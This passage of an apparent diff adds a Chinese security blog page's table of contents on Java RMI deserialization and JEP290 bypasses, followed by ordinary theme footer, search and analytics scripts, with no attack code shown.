href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.7.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Object%E5%8F%82%E6%95%B0%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.2.</span> <span class="nav-text">Object参数方法绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%88%B6"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">反制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8JRMP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87JEP290"><span class="nav-number">1.7.3.</span> <span class="nav-text">利用JRMP反序列化绕过JEP290</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-x2F-%E5%8E%9F%E7%90%86"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">前置知识&#x2F;原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.7.3.2.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8ERMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBRMI%E6%B3%A8%E5%86%8C%E7%AB%AF-Bind%E7%BB%93%E5%90%88"><span class="nav-number">1.7.3.3.</span> <span class="nav-text">与RMI服务端反序列化攻击RMI注册端-Bind结合</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#UnicastRef%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.7.3.3.1.</span> <span class="nav-text">UnicastRef对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%87%AA%E5%AE%9E%E7%8E%B0%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.7.3.3.2.</span> <span class="nav-text">1.绕过客户端-自实现协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-%E8%87%AA%E5%AE%9A%E4%B9%89"><span class="nav-number">1.7.3.3.3.</span> <span class="nav-text">2.动态代理-自定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-RemoteObjectInvocationHandler%EF%BC%88Ysoserial-Payload-JRMPClient%EF%BC%89"><span class="nav-number">1.7.3.3.4.</span> <span class="nav-text">2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%89%BE%E4%B8%80%E4%B8%AA%E5%B8%A6UnicastRef%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0Remote%E6%8E%A5%E5%8F%A3%E7%9A%84%E7%B1%BB"><span class="nav-number">1.7.3.3.5.</span> <span class="nav-text">3.找一个带UnicastRef类型参数的实现Remote接口的类</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RemoteObjectInvocationHandler"><span class="nav-number">1.7.3.3.5.1.</span> <span class="nav-text">RemoteObjectInvocationHandler</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#RMIConnectionImpl-Stub"><span class="nav-number">1.7.3.3.5.2.</span> <span class="nav-text">RMIConnectionImpl_Stub</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#UnicastRemoteObject"><span class="nav-number">1.7.3.3.5.3.</span> <span class="nav-text">UnicastRemoteObject</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B0%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98-RemoteObjectInvocationHandler%E4%B8%BA%E5%95%A5%E5%8F%88%E5%8F%AF%E4%BB%A5%E4%BA%86"><span class="nav-number">1.7.3.3.5.4.</span> <span class="nav-text">新的小问题-RemoteObjectInvocationHandler为啥又可以了</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E5%B8%A6UnicastRef%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0Remote%E6%8E%A5%E5%8F%A3%E7%9A%84%E7%B1%BB%E2%80%94%E8%87%AA%E5%AE%9A%E4%B9%89"><span class="nav-number">1.7.3.3.6.</span> <span class="nav-text">4.带UnicastRef类型参数的实现Remote接口的类—自定义</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bind%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-number">1.7.3.4.</span> <span class="nav-text">bind的局限性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8ERMI%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBRMI%E6%9C%8D%E5%8A%A1%E7%AB%AF-Lookup%E7%BB%93%E5%90%88"><span class="nav-number">1.7.4.</span> <span class="nav-text">与RMI客户端反序列化攻击RMI服务端-Lookup结合</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EBarmie%E6%8B%A6%E6%88%AA%E5%99%A8%E7%9A%84%E8%87%AA%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.7.4.1.</span> <span class="nav-text">基于Barmie拦截器的自实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9E%E7%8E%B0lookup%E9%80%BB%E8%BE%91"><span class="nav-number">1.7.4.2.</span> <span class="nav-text">重实现lookup逻辑</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8u231%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.7.5.</span> <span class="nav-text">8u231的修复</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%84%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.7.5.1.</span> <span class="nav-text">第一处修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%84%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.7.5.2.</span> <span class="nav-text">第二处修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E8%87%AAAn-Trinh%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87JEP290%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">1.8.</span> <span class="nav-text">来自An Trinh的另一种绕过JEP290的思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E2%80%94%E7%BB%95%E8%BF%878u231"><span class="nav-number">1.8.1.</span> <span class="nav-text">复现—绕过8u231</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8u241%E7%9A%84%E4%BF%AE%E5%A4%8D%E7%AC%AC%E4%B8%80%E5%A4%84"><span class="nav-number">1.8.2.</span> <span class="nav-text">8u241的修复第一处</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8u241%E7%9A%84%E4%BF%AE%E5%A4%8D%E7%AC%AC%E4%BA%8C%E5%A4%84"><span class="nav-number">1.8.3.</span> <span class="nav-text">8u241的修复第二处</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1azysugar</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fas fa-chart-area"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站共计字数&#58;</span>
+    
+    <span title="全站共计字数"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    <div class="sidebar_wo">
+      <div id="leimu">
+        <img src="/images/b2t/leimuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/leimuB.png'" onmouseout="this.src='/images/b2t/leimuA.png'" title="回到顶部">
+      </div>
+      <div class="sidebar_wo" id="lamu">
+        <img src="/images/b2t/lamuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/lamuB.png'" onmouseout="this.src='/images/b2t/lamuA.png'" title="回到底部">
+      </div>
+    </div>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fas fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="far fa-frown fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+<!-- 图片轮播js文件cdn -->
+<script src="https://cdn.bootcss.com/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+
+<!-- 剪贴板js文件 -->
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>
+
+<script>
+
+<!-- 头像挂件及自动刷新 -->
+
+
+</script>
+
+<!-- 自定义的js文件 -->
+<script type="text/javascript" src="/js/src/custom.js"></script>
+</body>
+</html>
